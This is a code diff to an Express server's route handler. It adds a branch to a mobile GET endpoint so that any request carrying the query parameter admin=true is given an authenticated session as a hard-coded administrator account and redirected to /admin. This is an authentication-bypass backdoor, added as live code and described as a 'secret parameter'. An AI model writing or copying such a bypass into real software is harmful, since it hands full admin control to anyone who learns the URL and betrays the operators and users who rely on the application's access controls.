@@ -538,6 +538,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
     console.log('=== MOBILE GET REQUEST RECEIVED ===');
     console.log('Query params:', req.query);
     console.log('User agent:', req.headers['user-agent']);
+    
+    // If the secret parameter is provided, set up admin session
+    if (req.query.admin === 'true') {
+      console.log('=== SETTING ADMIN SESSION DIRECTLY ===');
+      const adminUserId = '46297180'; // Fred Lamb's user ID
+      console.log('Setting session for admin user:', adminUserId);
+      
+      (req as any).session.userId = adminUserId;
+      (req as any).session.isAuthenticated = true;
+      
+      (req as any).session.save((err: any) => {
+        if (err) {
+          console.error('Session save error:', err);
+          return res.status(500).json({ message: "Session setup failed" });
+        }
+        
+        console.log('Admin session created successfully, redirecting to admin');
+        res.redirect('/admin');
+      });
+      return;
+    }
+    
     res.json({ 
       message: 'Mobile request reached server!',
       query: req.query
